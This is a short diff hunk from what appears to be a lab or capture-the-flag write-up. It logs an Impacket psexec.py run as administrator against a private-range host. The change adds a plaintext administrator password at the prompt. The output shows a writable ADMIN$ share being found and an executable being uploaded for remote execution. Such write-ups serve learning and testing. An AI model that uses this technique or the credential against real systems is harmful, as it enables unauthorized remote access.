@@ -280,7 +280,7 @@ Command-Line: python3 psexec.py administrator@10.129.193.123
 Result:
 Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
 
-Password:
+Password: kidvscat_admin_@123
     [*] Requesting shares on 10.129.193.123.....
     [*] Found writable share ADMIN$
     [*] Uploading file XLHwhHMj.exe
